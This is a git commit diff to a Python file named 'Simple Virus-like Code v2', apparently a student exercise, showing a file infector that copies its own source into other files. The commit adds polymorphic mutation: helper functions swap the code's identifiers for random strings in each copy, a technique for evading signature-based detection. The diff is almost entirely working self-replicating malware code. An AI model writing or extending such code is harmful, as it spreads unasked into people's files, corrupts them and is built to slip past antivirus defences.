d6ba99df293dc44747a205f1158b19fd64883b11
shiqiw <shiqiw@stanford.edu>
2015-08-11 08:56:45 -0700

    Random and dict

--- Simple Virus-like Code v2.py
+++ Simple Virus-like Code v2.py
@@ -7,20 +7,12 @@ def infect(filename):
 	os.rename(filename, filename + '~')
 	destination = open(filename, 'w')
 	source = open(filename + '~', 'r')
-	# __file__ is the pathname of the file from which the module was loaded, 
-	# if it was loaded from a file. 
-	# When the Python interpreter reads a source file, 
-	# it executes all of the code found in it. Before executing the code, 
-	# it will define a few special variables. 
-	# For example, if the python interpreter is running that module (the source file) 
-	# as the main program, it sets the special __name__ variable to have a value 
-	# "__main__". 
-	# If this file is being imported from another module, 
-	# __name__ will be set to the module's name.
 	this = open(__main__.__file__, 'r')
 
+	mutations = init_mutation()
+
 	for line in this:
-		destination.write(line)
+		destination.write(mutate(line, mutations))
 		if line.startswith("# MAGIC_CODE_SKD2835MDB"):
 			break
 
@@ -30,6 +22,26 @@ def infect(filename):
 	source.close()
 	destination.close()
 	this.close()
+
+# So this infection will randomly change function/values related to keyworkds
+def init_mutation():
+	original = ["filename", "find_and_infect_files", "init_mutation", \
+	"source", "is_infected", "infect", "rand_string", "original", "mutations"]
+	mutated = []
+	for o in original:
+		mutated.append((o, rand_string(len(o))))
+	return dict(mutated)
+
+def mutate(line, mutations):
+	for k, v in mutations.iteritems():
+		line = line.replace(k, v);
+	return line;
+
+def rand_string(length):
+	randstring = ""
+	for i in range(0, length):
+		randstring += chr(random.randint(97, 122))
+	return randstring
 
 def is_infected(filename):
 	f = open(filename, 'r')
